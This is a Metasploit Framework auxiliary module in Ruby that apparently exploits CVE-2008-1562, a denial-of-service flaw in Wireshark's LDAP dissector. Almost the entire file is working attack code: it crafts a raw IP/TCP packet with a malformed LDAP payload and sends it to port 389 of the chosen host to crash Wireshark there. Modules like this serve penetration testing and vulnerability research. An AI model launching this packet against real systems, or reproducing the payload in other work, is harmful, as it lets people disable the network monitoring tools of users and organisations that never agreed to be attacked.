##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'
require 'scruby'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ip
		
	def initialize
		super(
			'Name'        => 'Wireshark LDAP dissector DOS',
			'Description' => %q{
					The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers
					to cause a denial of service (application crash) via a malformed packet.
			},
			'Author'      => ['MC'],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision:$',
			'References'  =>
				[
					[ 'CVE', '2008-1562' ],
				],
			'DisclosureDate' => 'Mar 28 2008')
	end

	def run

		print_status("Sending malformed LDAP packet to #{rhost}")

		m = Rex::Text.rand_text_alpha_lower(3)
		
		connect_ip	

		pkt =( 
			Scruby::IP.new(
				:dst   => "#{rhost}",
				:flags => 2,
				:len   => 121,
				:ttl   => 128,
				:id    => 0xba6b,
				:chksum => 0x1e86
			)/Scruby::TCP.new(
				:dport => 389,
				:seq   => 1980536076,
				:ack   => 3945163501, 
				:window => 64833,
				:chksum => 0xa8ce,
				:flags => 18
			)/"0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
		).to_net
		
		ip_write(pkt)

		disconnect_ip

	end

end

